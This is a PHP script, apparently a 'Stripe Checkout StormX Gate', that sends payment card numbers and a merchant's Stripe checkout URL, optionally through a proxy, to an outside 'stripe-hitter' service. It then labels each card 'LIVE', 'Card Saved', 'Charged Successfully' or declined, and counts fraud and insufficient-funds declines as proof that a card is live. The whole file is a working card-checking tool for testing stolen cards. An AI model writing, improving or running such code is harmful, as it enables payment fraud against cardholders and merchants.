<?php
// Stripe Checkout StormX Gate
// This file is meant to be included, not accessed directly

// Only process if called via include
if (basename($_SERVER['PHP_SELF']) === 'stripe_checkout_stormx.php' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
}

$checkoutUrl = $_POST['checkout_url'] ?? $_GET['checkout_url'] ?? '';
$card = $_POST['cc'] ?? $_GET['cc'] ?? '';
$proxy = $_POST['proxy'] ?? $_GET['proxy'] ?? '';

if (empty($checkoutUrl) || empty($card)) {
    echo json_encode(['success' => false, 'error' => 'Missing checkout URL or card']);
    return;
}

// API Key for StormX
$API_KEY = "darkkboy";

// Build StormX API URL
$stormxUrl = "https://hitter.stormx.pw/stripe-hitter";
$encodedSite = urlencode($checkoutUrl);
$encodedCard = urlencode($card);
$fullUrl = "{$stormxUrl}?key={$API_KEY}&site={$encodedSite}&cc={$encodedCard}";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $fullUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1");
curl_setopt($ch, CURLOPT_TIMEOUT, 45);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
}

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Parse the response
$data = json_decode($response, true);

// Get site domain for display
$siteDomain = 'UNKNOWN';
if (!empty($checkoutUrl)) {
    $parsed = parse_url($checkoutUrl);
    $siteDomain = $parsed['host'] ?? 'UNKNOWN';
}

$checkoutInfo = [
    'amount' => 'N/A',
    'site' => $siteDomain,
    'receipt' => 'N/A',
    'product' => 'Stripe Checkout',
    'checkout_type' => 'PAYMENT',
    'email' => 'N/A',
    'country' => 'US'
];

if ($httpCode !== 200) {
    echo json_encode([
        'success' => true,
        'status' => 'declined',
        'message' => 'Connection failed to StormX API',
        'checkout_info' => $checkoutInfo
    ]);
    return;
}

$textContent = strtolower($response);

// Check for successful payment (succeeded status)
if (strpos($response, '"status": "succeeded"') !== false && strpos($textContent, 'setup_intent') !== false) {
    echo json_encode([
        'success' => true,
        'status' => 'approved',
        'message' => '✅ Trial Approved - Card Saved',
        'checkout_info' => $checkoutInfo
    ]);
    return;
}

// Check for checkout succeeded session
if (strpos($textContent, 'checkout_succeeded_session') !== false) {
    echo json_encode([
        'success' => true,
        'status' => 'approved',
        'message' => '✅ Checkout Succeeded - Card Saved',
        'checkout_info' => $checkoutInfo
    ]);
    return;
}

// Parse JSON response
if ($data && isset($data['success'])) {
    if ($data['success'] === true) {
        if (isset($data['requires3DS']) && $data['requires3DS'] === true) {
            echo json_encode([
                'success' => true,
                'status' => 'approved',
                'message' => '⚠️ 3D Secure Required - Payment not completed but card is LIVE',
                'checkout_info' => $checkoutInfo
            ]);
            return;
        }
        
        echo json_encode([
            'success' => true,
            'status' => 'approved',
            'message' => '✅ Live Card - Charged Successfully',
            'checkout_info' => $checkoutInfo
        ]);
        return;
    }
    
    // Handle errors
    $error = $data['error'] ?? [];
    $code = $error['code'] ?? '';
    $declineCode = $error['decline_code'] ?? '';
    $message = $error['message'] ?? 'Card declined';
    
    if (strpos($code, 'payment_intent_unexpected_state') !== false) {
        echo json_encode([
            'success' => true,
            'status' => 'declined',
            'message' => '❌ Payment Completed/Expired',
            'checkout_info' => $checkoutInfo
        ]);
        return;
    }
    
    if (strpos($code, 'checkout_amount_mismatch') !== false) {
        echo json_encode([
            'success' => true,
            'status' => 'declined',
            'message' => '❌ Checkout amount mismatch',
            'checkout_info' => $checkoutInfo
        ]);
        return;
    }
    
    if (strpos($code, 'card_declined') !== false) {
        echo json_encode([
            'success' => true,
            'status' => 'declined',
            'message' => '❌ Card Declined',
            'checkout_info' => $checkoutInfo
        ]);
        return;
    }
    
    $liveIndicators = ['generic_decline', 'do_not_honor', 'fraudulent', 'insufficient_funds', 'cvv2_failure'];
    foreach ($liveIndicators as $indicator) {
        if (stripos($declineCode, $indicator) !== false || stripos($code, $indicator) !== false) {
            echo json_encode([
                'success' => true,
                'status' => 'approved',
                'message' => '💳 Card is LIVE - Decline: ' . str_replace('_', ' ', $declineCode ?: $code),
                'checkout_info' => $checkoutInfo
            ]);
            return;
        }
    }
    
    if (stripos($message, 'expired') !== false || stripos($code, 'expired') !== false) {
        echo json_encode([
            'success' => true,
            'status' => 'declined',
            'message' => '❌ Card expired',
            'checkout_info' => $checkoutInfo
        ]);
        return;
    }
    
    echo json_encode([
        'success' => true,
        'status' => 'declined',
        'message' => '❌ ' . $message,
        'checkout_info' => $checkoutInfo
    ]);
    return;
}

if (strpos($textContent, 'payment processing failed') !== false) {
    echo json_encode([
        'success' => true,
        'status' => 'declined',
        'message' => '❌ Checkout Completed/Expired/Failed',
        'checkout_info' => $checkoutInfo
    ]);
    return;
}

echo json_encode([
    'success' => true,
    'status' => 'declined',
    'message' => '❌ Unknown response from API',
    'checkout_info' => $checkoutInfo
]);
?>
